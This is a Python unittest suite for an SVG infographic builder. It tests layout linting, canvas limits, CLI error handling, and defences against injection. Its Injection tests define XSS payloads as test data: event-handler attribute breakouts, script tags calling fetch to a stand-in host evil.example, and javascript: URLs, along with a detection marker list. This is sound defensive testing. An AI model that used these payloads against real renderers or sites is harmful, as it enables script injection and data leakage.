"""Tests for build.py (stdlib unittest only).

Run from the repo root:
  python3 -m unittest discover -s plugins/infographic-diagram/skills/infographic-diagram/scripts -p 'test_*.py'
"""
import contextlib
import io
import json
import os
import subprocess
import sys
import tempfile
import types
import unittest
import xml.dom.minidom

sys.dont_write_bytecode = True
HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import build  # noqa: E402

BUILD = os.path.join(HERE, "build.py")
EXAMPLES = os.path.join(os.path.dirname(HERE), "examples")
EVIL = ('red" onload="alert(1)" x="', '#000"><script>fetch("http://evil.example/x")</script><rect fill="',
        "url(http://evil.example/a.png)", "javascript:alert(1)", "#fff' onmouseover='a()")
BAD_MARKERS = ("onload", "onmouseover", "<script", "javascript:", "http://evil", "href=")


def run_cli(*args, stdin_env=None):
    env = dict(os.environ, PYTHONDONTWRITEBYTECODE="1", PYTHONIOENCODING="utf-8")
    return subprocess.run([sys.executable, BUILD, *args], capture_output=True, text=True,
                          encoding="utf-8", env=env)


def map_spec(**kw):
    s = {"title": "T", "width": 1200,
         "panels": [{"id": "a", "x": 20, "y": 170, "w": 300, "h": 200, "title": "A",
                     "items": [{"id": "i", "label": "Item"}]},
                    {"id": "b", "x": 500, "y": 170, "w": 300, "h": 200, "title": "B"}],
         "edges": [{"from": "a", "to": "b", "label": "go"}]}
    s.update(kw)
    return s


def layers_spec(**kw):
    s = {"type": "layers", "title": "T",
         "layers": [{"name": "ONE", "theme": "teal", "rows": [{"items": [{"label": "chip", "icon": "box"}]}]}]}
    s.update(kw)
    return s


def tree_spec(**kw):
    s = {"type": "tree", "title": "T", "root": {"label": "Root"},
         "rows": [[{"title": "G", "items": [{"label": "x"}]}]]}
    s.update(kw)
    return s


def issues_of(spec):
    return build.build(spec)[1]


def assert_clean_svg(tc, svg):
    low = svg.lower()
    for m in BAD_MARKERS:
        tc.assertNotIn(m, low, f"{m!r} leaked into the SVG")
    xml.dom.minidom.parseString(svg)          # well-formed: no attribute breakout


class Examples(unittest.TestCase):
    def test_examples_build_clean_with_strict(self):
        names = sorted(f for f in os.listdir(EXAMPLES) if f.endswith(".json"))
        self.assertEqual(len(names), 4)
        with tempfile.TemporaryDirectory() as d:
            for n in names:
                with self.subTest(example=n):
                    out = os.path.join(d, n.replace(".json", ".svg"))
                    r = run_cli(os.path.join(EXAMPLES, n), out, "--strict")
                    self.assertEqual(r.returncode, 0, r.stderr)
                    self.assertIn("LINT: clean", r.stdout)
                    with open(out, encoding="utf-8") as f:
                        xml.dom.minidom.parseString(f.read())


class Injection(unittest.TestCase):
    """M1: nothing from the spec can break out of an SVG attribute."""

    def test_colour_fields_are_allowlisted_everywhere(self):
        for evil in EVIL:
            specs = {
                "map background": map_spec(background=evil),
                "layers background": layers_spec(background=evil),
                "tree background": tree_spec(background=evil),
                "tree icon_color": tree_spec(icon="brain", icon_color=evil),
                "tree root.color": tree_spec(root={"label": "R", "color": evil}),
                "tree group color": tree_spec(rows=[[{"title": "G", "color": evil, "item_color": evil,
                                                      "items": [{"label": "x", "color": evil}],
                                                      "box": "B"}]]),
            }
            for name, spec in specs.items():
                with self.subTest(field=name, value=evil):
                    svg, issues, _ = build.build(spec)
                    assert_clean_svg(self, svg)
                    self.assertTrue(any(i.startswith("SPEC") for i in issues), issues)

    def test_theme_names_never_reach_output(self):
        for evil in EVIL:
            spec = map_spec(edges=[{"from": "a", "to": "b", "theme": evil}])
            spec["panels"][0]["theme"] = evil
            spec["panels"][0]["items"][0]["theme"] = evil
            svg, issues, _ = build.build(spec)
            assert_clean_svg(self, svg)
            svg2, _, _ = build.build(layers_spec(layers=[{"name": "N", "theme": evil}],
                                                 rails={"left": {"title": "R", "theme": evil}}))
            assert_clean_svg(self, svg2)

    def test_numbers_are_coerced_or_rejected(self):
        bad = ['1200" onload="alert(1)', "nan", "inf", [1], {"a": 1}, True]
        for v in bad:
            for spec in (map_spec(width=v), map_spec(height=v), layers_spec(width=v), tree_spec(width=v),
                         layers_spec(gap=v), layers_spec(rail_width=v)):
                with self.subTest(value=v):
                    with self.assertRaises(build.SpecError):
                        build.build(spec)
        p = map_spec()
        p["panels"][0]["x"] = '20" onclick="x()'
        with self.assertRaises(build.SpecError):
            build.build(p)
        e = map_spec(edges=[{"from": "a", "to": "b", "midX": "1) onload=(1"}])
        with self.assertRaises(build.SpecError):
            build.build(e)
        # numeric strings are fine (coerced with float())
        svg, _, (W, _) = build.build(map_spec(width="1200"))
        self.assertEqual(W, 1200)

    def test_text_fields_are_escaped(self):
        evil = '</text><script>alert(1)</script><text a="'
        spec = map_spec(title=evil, subtitle=evil)
        spec["panels"][0].update(subtitle=evil, footer=evil)
        spec["panels"][0]["items"][0].update(label=evil, sublabel=evil)
        spec["edges"][0]["label"] = evil
        for s in (spec, layers_spec(kicker=evil, subtitle=evil, byline=evil,
                                    layers=[{"name": evil, "tagline": evil, "note": evil, "prefix": evil,
                                             "icon": "box", "icon_label": evil, "aside": {"text": evil},
                                             "rows": [{"items": [{"label": evil}]}]}],
                                    summary=[{"text": evil}]),
                  tree_spec(title=evil, footer=evil, root={"label": evil},
                            rows=[[{"title": evil, "box": evil, "items": [{"label": evil}]}]])):
            svg = build.build(s)[0]
            assert_clean_svg(self, svg)

    def test_valid_colours_pass_through(self):
        for ok in ("#abc", "#AABBCC", "#aabbcc80", "rgb(1, 2, 3)", "rgba(1,2,3,0.5)", "rebeccapurple"):
            svg, issues, _ = build.build(map_spec(background=ok))
            self.assertIn(f'fill="{ok}"', svg)
            self.assertFalse(any("background" in i for i in issues))

    def test_png_step_loads_svg_as_image_without_scripts_or_network(self):
        evil_svg = '<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("http://evil.example")</script></svg>'
        page = build.png_html(evil_svg, 100, 50)
        self.assertNotIn("<svg", page)
        self.assertNotIn("<script", page)
        self.assertIn('src="data:image/svg+xml;base64,', page)
        self.assertIn("default-src 'none'", page)

        calls = {}

        class Route:
            def __init__(self, url):
                self.request = types.SimpleNamespace(url=url)

            def abort(self):
                calls.setdefault("aborted", []).append(self.request.url)

            def continue_(self):
                calls.setdefault("continued", []).append(self.request.url)

        class Page:
            def set_content(self, html, **kw):
                calls["html"] = html

            def locator(self, sel):
                calls["locator"] = sel
                return types.SimpleNamespace(screenshot=lambda path, **kw: open(path, "wb").close())

        class Ctx:
            def route(self, pattern, handler):
                calls["route"] = pattern
                handler(Route("http://evil.example/x"))
                handler(Route("data:image/svg+xml;base64,AA=="))

            def new_page(self):
                return Page()

        class Browser:
            def new_context(self, **kw):
                calls["ctx"] = kw
                return Ctx()

            def close(self):
                calls["closed"] = True

        class PW:
            chromium = types.SimpleNamespace(launch=lambda **kw: Browser())

            def __enter__(self):
                return self

            def __exit__(self, *a):
                return False

        fake = types.ModuleType("playwright.sync_api")
        fake.sync_playwright = PW
        with tempfile.TemporaryDirectory() as d, _modules({"playwright": types.ModuleType("playwright"),
                                                          "playwright.sync_api": fake}):
            build.to_png(evil_svg, os.path.join(d, "x.png"), 100, 50)
        self.assertIs(calls["ctx"]["java_script_enabled"], False)
        self.assertIs(calls["ctx"]["offline"], True)
        self.assertEqual(calls["route"], "**/*")
        self.assertEqual(calls["aborted"], ["http://evil.example/x"])
        self.assertNotIn("<svg", calls["html"])
        self.assertTrue(calls["closed"])


@contextlib.contextmanager
def _modules(mods):
    saved = {k: sys.modules.get(k, _MISSING) for k in mods}
    sys.modules.update(mods)
    try:
        yield
    finally:
        for k, v in saved.items():
            if v is _MISSING:
                sys.modules.pop(k, None)
            else:
                sys.modules[k] = v


_MISSING = object()
LONG = "An extremely long label that will definitely overflow any box " * 2


class Lint(unittest.TestCase):
    """M2/M3: lint sees every text it claims to see."""

    def has(self, issues, *needles):
        self.assertTrue(any(all(n in i for n in needles) for i in issues),
                        f"no issue containing {needles}: {issues}")

    def test_map_texts(self):
        spec = map_spec(title=LONG, subtitle=LONG)
        spec["panels"][0]["footer"] = LONG
        spec["edges"][0]["label"] = LONG * 2
        iss = issues_of(spec)
        self.has(iss, "OVERFLOW", "page title")
        self.has(iss, "OVERFLOW", "page subtitle")
        self.has(iss, "OVERFLOW", 'panel "a" footer')
        self.has(iss, "CANVAS", "label")

    def test_map_canvas_y(self):
        iss = issues_of(map_spec(height=300))
        self.has(iss, "CANVAS", 'panel "a"', "height 300")
        spec = map_spec()
        spec["panels"][1]["y"] = -50
        self.has(issues_of(spec), "CANVAS", 'panel "b"')

    def test_layers_texts(self):
        iss = issues_of(layers_spec(kicker=LONG, title=LONG, subtitle=LONG, byline=LONG * 2,
                                    layers=[{"name": LONG, "tagline": "t", "note": LONG, "icon": "box",
                                             "icon_label": LONG, "aside": {"text": LONG * 3}}],
                                    rails={"left": {"title": "R", "bullets": ["b"] * 30}},
                                    summary=[{"text": LONG * 2}] + [{"text": "x"}] * 3))
        for where in ("kicker", "title", "subtitle", "byline", "header", "note", "icon_label",
                      "aside text", "rails.left", "summary[0] text"):
            self.has(iss, "OVERFLOW", where)

    def test_layers_wrapped_chips_overflow(self):
        chips = [{"label": f"Chip number {k}", "icon": "box"} for k in range(14)]
        spec = layers_spec(layers=[{"name": "N", "aside": {"text": "hello world there", "w": 170},
                                    "rows": [{"items": chips}]}])
        self.has(issues_of(spec), "OVERFLOW", "chip row(s)", "raise h")
        spec["layers"][0]["h"] = 260
        self.assertFalse(any("chip row" in i for i in issues_of(spec)))

    def test_tree_texts(self):
        iss = issues_of(tree_spec(title=LONG, footer=LONG, root={"label": LONG},
                                  rows=[[{"title": "G", "box": LONG * 2, "items": [{"label": "x"}]}]]))
        for where in ("title", "root label", "footer", "box"):
            self.has(iss, "OVERFLOW", where)

    def test_unknown_theme_is_a_lint_issue_in_every_archetype(self):
        m = map_spec()
        m["panels"][0]["theme"] = "nope"
        self.has(issues_of(m), "SPEC", "unknown theme 'nope'")
        self.has(issues_of(layers_spec(layers=[{"name": "N", "theme": "indigo"}])), "SPEC", "unknown theme 'indigo'")
        self.has(issues_of(tree_spec(rows=[[{"title": "G", "color": "nope"}]])), "SPEC", "'nope'")


class Limits(unittest.TestCase):
    """G4-M2 canvas cap, G2 control characters, S18 chip sizes."""

    def test_auto_height_is_capped_with_a_lint_issue(self):
        tall_layers = layers_spec(layers=[{"name": f"L{i}", "rows": [{"items": [{"label": "x"}]}]}
                                          for i in range(150)])
        tall_tree = tree_spec(rows=[[{"title": f"G{i}", "items": [{"label": "x"}]}] for i in range(400)])
        tall_map = map_spec(panels=[{"id": "a", "x": 20, "y": 30000, "w": 300, "h": 200, "title": "A"}], edges=[])
        for spec in (tall_layers, tall_tree, tall_map):
            svg, issues, (W, H) = build.build(spec)
            self.assertEqual(H, build.MAX_CANVAS, spec.get("type", "map"))
            self.assertIn(f'height="{build.MAX_CANVAS}"', svg)
            self.assertTrue(any(i.startswith("CANVAS") and "split the diagram" in i for i in issues), issues)
        small = build.build(layers_spec())
        self.assertLess(small[2][1], build.MAX_CANVAS)
        self.assertFalse(any("split the diagram" in i for i in small[1]))

    def test_xml_invalid_control_characters_are_dropped(self):
        for spec in (map_spec(title="a\u0001b\u001fc\ufffe"), layers_spec(title="x\u0008y"),
                     tree_spec(title="t\u000bu")):
            svg = build.build(spec)[0]
            xml.dom.minidom.parseString(svg)
            self.assertNotRegex(svg, "[\x00-\x08\x0b\x0c\x0e-\x1f]")

    def test_chip_drawing_uses_the_layout_measurements(self):
        import layers
        for label, ic in (("chip", None), ("two\nlines", "box"), ("ไทย label", "db")):
            P = []
            w = layers._chip(P, 0, 100, label, ic, "#000", "#fff", "#111")
            it = {"label": label, "icon": ic}
            self.assertEqual(w, layers.chip_w(it))
            self.assertIn(f'height="{layers.chip_h(it)}"', P[0])


class Cli(unittest.TestCase):
    def setUp(self):
        self._d = tempfile.TemporaryDirectory()
        self.d = self._d.name

    def tearDown(self):
        self._d.cleanup()

    def spec_file(self, spec, name="s.json", raw=None, encoding="utf-8"):
        p = os.path.join(self.d, name)
        with open(p, "w", encoding=encoding) as f:
            f.write(raw if raw is not None else json.dumps(spec, ensure_ascii=False))
        return p

    def test_bad_specs_exit_2_with_clean_message(self):
        no_y = map_spec()
        del no_y["panels"][0]["y"]
        no_title = map_spec()
        del no_title["panels"][0]["title"]
        dotted = map_spec()
        dotted["panels"][0]["id"] = "a.b"
        dup = map_spec()
        dup["panels"][1]["id"] = "a"
        cases = {
            "missing y": (no_y, "y"),
            "missing title": (no_title, "title"),
            "unknown edge id": (map_spec(edges=[{"from": "a", "to": "zz"}]), '"zz"'),
            "dotted panel id": (dotted, "must not contain"),
            "duplicate id": (dup, "duplicate"),
            "bad side": (map_spec(edges=[{"from": "a", "to": "b", "fromSide": "up"}]), "fromSide"),
            "layers without layers": ({"type": "layers"}, "layers"),
            "tree without rows": ({"type": "tree"}, "rows"),
            "tree item without label": (tree_spec(rows=[[{"title": "G", "items": [{"icon": "x"}]}]]), "label"),
            "top-level list": ([1, 2], "JSON object"),
            "unknown type": ({"type": "pie"}, "type"),
            "label wrong type": (map_spec(panels=[{"id": "a", "x": 1, "y": 1, "w": 9, "h": 9, "title": "t",
                                                   "items": [{"label": {"x": 1}}]}], edges=[]), "label"),
        }
        for name, (spec, needle) in cases.items():
            with self.subTest(case=name):
                out = os.path.join(self.d, "o.svg")
                r = run_cli(self.spec_file(spec), out)
                self.assertEqual(r.returncode, 2, r.stderr)
                self.assertTrue(r.stderr.startswith("ERROR:"), r.stderr)
                self.assertIn(needle, r.stderr)
                self.assertNotIn("Traceback", r.stderr)
                self.assertFalse(os.path.exists(out))
        for raw in ("{not json", ""):
            r = run_cli(self.spec_file(None, raw=raw), os.path.join(self.d, "o.svg"))
            self.assertEqual(r.returncode, 2)
            self.assertNotIn("Traceback", r.stderr)
        r = run_cli(os.path.join(self.d, "missing.json"), os.path.join(self.d, "o.svg"))
        self.assertEqual(r.returncode, 2)
        self.assertNotIn("Traceback", r.stderr)

    def test_label_numbers_are_accepted(self):
        spec = map_spec()
        spec["panels"][0]["items"][0]["label"] = 5
        r = run_cli(self.spec_file(spec), os.path.join(self.d, "o.svg"))
        self.assertEqual(r.returncode, 0, r.stderr)

    def test_bom_accepted(self):
        r = run_cli(self.spec_file(map_spec(), encoding="utf-8-sig"), os.path.join(self.d, "o.svg"), "--strict")
        self.assertEqual(r.returncode, 0, r.stderr)

    def test_output_directory_created_and_flags_in_any_order(self):
        out = os.path.join(self.d, "new", "deeper", "o.svg")
        r = run_cli("--strict", self.spec_file(map_spec()), out)
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertTrue(os.path.isfile(out))

    def test_non_ascii_output_path(self):
        out = os.path.join(self.d, "แผนภาพ", "ไดอะแกรม.svg")
        r = run_cli(self.spec_file(map_spec()), out)
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertTrue(os.path.isfile(out))

    def test_png_out_path_rules(self):
        s = self.spec_file(map_spec())
        r = run_cli(s, os.path.join(self.d, "x.png"))
        self.assertEqual(r.returncode, 2)
        self.assertIn(".png", r.stderr)
        self.assertFalse(os.path.exists(os.path.join(self.d, "x.png")))
        out = os.path.join(self.d, "x.svg")
        r = run_cli(s, out, "--png-out", out)
        self.assertEqual(r.returncode, 2)

    def test_strict_exits_1_on_issues(self):
        r = run_cli(self.spec_file(map_spec(title=LONG)), os.path.join(self.d, "o.svg"), "--strict")
        self.assertEqual(r.returncode, 1)
        self.assertIn("OVERFLOW", r.stderr)
        r = run_cli(self.spec_file(map_spec(title=LONG)), os.path.join(self.d, "o.svg"))
        self.assertEqual(r.returncode, 0)

    def test_png_without_playwright_keeps_svg_and_exits_3(self):
        out = os.path.join(self.d, "o.svg")
        err = io.StringIO()
        with _modules({"playwright": None, "playwright.sync_api": None}), \
                contextlib.redirect_stderr(err), contextlib.redirect_stdout(io.StringIO()):
            rc = build.main([self.spec_file(map_spec()), out, "--png"])
        self.assertEqual(rc, 3)
        self.assertTrue(os.path.isfile(out))
        self.assertIn("pip install playwright", err.getvalue())
        self.assertFalse(os.path.exists(os.path.join(self.d, "o.png")))


if __name__ == "__main__":
    unittest.main()
